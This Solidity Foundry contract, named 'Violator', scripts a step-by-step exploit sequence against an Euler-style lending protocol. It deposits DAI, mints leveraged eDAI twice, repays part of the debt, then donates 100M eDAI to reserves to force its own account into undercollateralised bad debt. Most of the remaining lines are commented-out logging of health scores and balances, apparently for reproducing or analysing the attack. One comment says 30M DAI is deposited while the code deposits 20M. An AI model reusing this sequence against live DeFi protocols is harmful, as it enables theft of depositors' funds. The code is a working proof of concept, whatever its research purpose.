// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";
import { IMarkets } from "./interface/IMarkets.sol";
import { IRiskManager } from "../contracts/IRiskManager.sol";

import "forge-std/src/Test.sol";

contract Violator is Test {
    IERC20 immutable DAI;
    IEToken immutable eDAI;
    IDToken immutable dDAI;
    address immutable EULER;
    IMarkets immutable MARKETS;
    ILiquidation immutable LIQUIDATION;
    address person;
    IRiskManager immutable RISK_MANAGER;

    constructor(IERC20 _dai, IEToken _eDAI, IDToken _dDAI, address _euler, ILiquidation _liquidation, IMarkets _markets, address _person) {
        DAI = _dai;
        eDAI = _eDAI;
        dDAI = _dDAI;
        EULER = _euler;
        MARKETS = _markets;
        LIQUIDATION = _liquidation;
        person = _person;
    }

    // log: balance, total balance, interest rate
    function violate() external {
        // reserve fee does not change during violation
        //MARKETS.getReserveFee("Reserve Fee:", address(eDAI));
        //MARKETS.getInterestRate("Interest before deposit:", address(eDAI));
        //MARKETS.getTotalBalances("Total balances before depositing:", address(eDAI));
        //MARKETS.getTotalBorrows("Total borrows before depositing:", address(eDAI));

        // for safeTransferFrom in deposit
        DAI.approve(EULER, type(uint256).max);
        
        // 3. Deposit 30M DAI 
        
        eDAI.deposit(0, 20_000_000 * 1e18);
        MARKETS.getUserAsset("after depositing", address(eDAI), address(this));
        //MARKETS.getInterestRate("Interest after deposit:", address(eDAI));
        //MARKETS.getTotalBalances("Total balances after depositing:", address(eDAI));
        //MARKETS.getTotalBorrows("Total borrows after depositing:", address(eDAI));
        //IRiskManager.LiquidityStatus memory status = MARKETS.getLiquidityStatus(address(this));
        //emit log_named_decimal_uint("collateral value after depositing", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after depositing", status.liabilityValue, 18);
        // 4. Borrow (mint) 10 x deposit
        eDAI.mint(0, 200_000_000 * 1e18);
        MARKETS.getUserAsset("after minting", address(eDAI), address(this));
        //emit log_named_decimal_uint("Health score after minting (1): ", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        //status = MARKETS.getLiquidityStatus(address(this));
        //emit log_named_decimal_uint("collateral value after minting (1)", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after minting (1)", status.liabilityValue, 18);
        //MARKETS.getInterestRate("Interest after minting (1):", address(eDAI));
        //MARKETS.getTotalBalances("Total balances after minting (1):", address(eDAI));
        //MARKETS.getTotalBorrows("Total borrows after minting (1):", address(eDAI));

        // 4. Repay 10M DAI
        dDAI.repay(0, 10_000_000 * 1e18);
        //emit log_named_decimal_uint("Health score after repaying: ", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        //status = MARKETS.getLiquidityStatus(address(this));
        MARKETS.getUserAsset("after repaying", address(eDAI), address(this));
        //emit log_named_decimal_uint("collateral value after repaying", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after repaying", status.liabilityValue, 18);
        //MARKETS.getInterestRate("Interest after repaying:", address(eDAI));
        //MARKETS.getTotalBalances("Total balances after repaying:", address(eDAI));
        //MARKETS.getTotalBorrows("Total borrows after repaying:", address(eDAI));

        // 5. Mint 10 x deposit again
        eDAI.mint(0, 200_000_000 * 1e18);
        MARKETS.getUserAsset("after minting", address(eDAI), address(this));
        //emit log_named_decimal_uint("Health score after minting (2): ", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        //status = MARKETS.getLiquidityStatus(address(this));
        //emit log_named_decimal_uint("collateral value after minting (2)", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after minting (2)", status.liabilityValue, 18);
        //MARKETS.getInterestRate("Interest after minting (2):", address(eDAI));
        //MARKETS.getTotalBalances("Total balances after minting (2):", address(eDAI));
        //MARKETS.getTotalBorrows("Total borrows after minting (2):", address(eDAI));
        
        // 6. Donate 100M DAI
        //MARKETS.getReserveBalance("Reserve balance before donating:", address(eDAI));
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
        MARKETS.getUserAsset("after donating", address(eDAI), address(this));
        //emit log_named_decimal_uint("Health score after donating: ", LIQUIDATION.checkLiquidation(person, address(this), address(DAI), address(DAI)).healthScore, 18);
        //status = MARKETS.getLiquidityStatus(address(this));
        //emit log_named_decimal_uint("collateral value after donating", status.collateralValue, 18);
        //emit log_named_decimal_uint("liability value after donating", status.liabilityValue, 18);
        //MARKETS.getReserveBalance("Reserve balance after donating:", address(eDAI));
        //MARKETS.getInterestRate("Interest after donating:", address(eDAI));
        //MARKETS.getTotalBalances("Total balances after donating:", address(eDAI));
        //MARKETS.getTotalBorrows("Total borrows after donating:", address(eDAI));
    }
}